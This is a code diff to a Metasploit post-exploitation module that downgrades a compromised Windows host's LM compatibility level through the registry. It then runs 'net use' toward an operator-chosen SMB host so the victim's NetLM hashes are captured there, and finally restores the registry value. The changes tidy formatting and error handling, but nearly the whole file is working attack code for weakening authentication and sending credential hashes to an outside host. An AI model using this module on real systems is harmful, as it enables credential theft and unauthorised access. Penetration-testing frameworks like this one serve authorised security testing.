@@ -1,8 +1,4 @@
 ##
-# $Id: netlm_downgrade.rb
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -31,16 +27,21 @@ class Metasploit3 < Msf::Post
 				NetLM hashes
 				},
 			'License'        => MSF_LICENSE,
-			'Author'         => [ 'Brandon McCann "zeknox" <bmccann [at] accuvant.com>', 'Thomas McCarthy "smilingraccoon" <smilingraccoon [at] gmail.com>'],
+			'Author'         =>
+				[
+					'Brandon McCann "zeknox" <bmccann [at] accuvant.com>',
+					'Thomas McCarthy "smilingraccoon" <smilingraccoon [at] gmail.com>'
+				],
 			'SessionTypes'   => [ 'meterpreter' ],
-			'References'     => [
-				[ 'URL', 'http://www.fishnetsecurity.com/6labs/blog/post-exploitation-using-netntlm-downgrade-attacks']
-			]
+			'References'     =>
+				[
+					[ 'URL', 'http://www.fishnetsecurity.com/6labs/blog/post-exploitation-using-netntlm-downgrade-attacks']
+				]
 		))
 
 		register_options(
 			[
-				OptAddress.new(   'SMBHOST',    [ true,  'IP Address where SMB host is listening to capture hashes.' ])
+				OptAddress.new('SMBHOST', [ true, 'IP Address where SMB host is listening to capture hashes.' ])
 			], self.class)
 	end
 
@@ -48,8 +49,10 @@ class Metasploit3 < Msf::Post
 	def smb_connect
 		begin
 			print_status("Establishing SMB connection to " + datastore['SMBHOST'])
-			cmd_exec("cmd.exe","/c net use \\\\#{datastore['SMBHOST']}")
-			print_status("The SMBHOST should now have NetLM hashes")
+			res = cmd_exec("cmd.exe","/c net use \\\\#{datastore['SMBHOST']}")
+			if res =~ /The command completed successfully/
+				print_good("The SMBHOST should now have NetLM hashes")
+			end
 		rescue
 			print_error("Issues establishing SMB connection")
 		end
@@ -62,46 +65,50 @@ class Metasploit3 < Msf::Post
 			# running as SYSTEM and will not pass any network credentials
 			print_error "Running as SYSTEM, should be run as valid USER"
 			return
+		end
+
+		subkey = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"
+		v_name = "lmcompatibilitylevel"
+		netlm = registry_getvaldata(subkey, v_name)
+		if netlm.nil?
+			print_error("Issues enumerating registry values")
+			return
+		end
+
+		if netlm == 0
+			print_status("NetLM is already enabled on this system")
+
+			# call smb_connect method to pass network hashes
+			smb_connect
 		else
-			subkey = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"
-			v_name = "lmcompatibilitylevel"
-			begin
-				netlm = registry_getvaldata(subkey, v_name)
-			rescue
+
+			print_status("NetLM is Disabled: #{subkey}#{v_name} == #{netlm.to_s}")
+			v = registry_setvaldata(subkey,v_name,0,"REG_DWORD")
+			if v.nil?
+				print_error("Issues modifying registry value")
+				return
+			end
+
+			post_netlm = registry_getvaldata(subkey, v_name)
+			if post_netlm.nil?
 				print_error("Issues enumerating registry values")
+				return
 			end
 
-			if netlm == 0
-				print_status("NetLM is already enabled on this system")
+			print_good("NetLM is Enabled:  #{subkey}#{v_name} == #{post_netlm.to_s}")
 
 				# call smb_connect method to pass network hashes
-				smb_connect
+			smb_connect
+
+			# cleanup the registry
+			v = registry_setvaldata(subkey,v_name,netlm,"REG_DWORD")
+			if v
+				print_status("Cleanup Completed: #{subkey}#{v_name} == #{netlm.to_s}")
 			else
-				begin
-					print_status("NetLM is Disabled: #{subkey}#{v_name} == #{netlm.to_s}")
-					registry_setvaldata(subkey,v_name,0,"REG_DWORD")
-				rescue
-					print_error("Issues modifying registry value")
-				end
-
-				begin
-					post_netlm = registry_getvaldata(subkey, v_name)
-					print_good("NetLM is Enabled:  #{subkey}#{v_name} == #{post_netlm.to_s}")
-				rescue
-					print_error("Issues enumerating registry values")
-				end
-
-				# call smb_connect method to pass network hashes
-				smb_connect
-
-				# cleanup the registry
-				begin
-					registry_setvaldata(subkey,v_name,netlm,"REG_DWORD")
-					print_status("Cleanup Completed: #{subkey}#{v_name} == #{netlm.to_s}")
-				rescue
-					print_error("Issues cleaning up registry changes")
-				end
+				print_error("Issues cleaning up registry changes")
+				return
 			end
+
 		end
 	end
 end
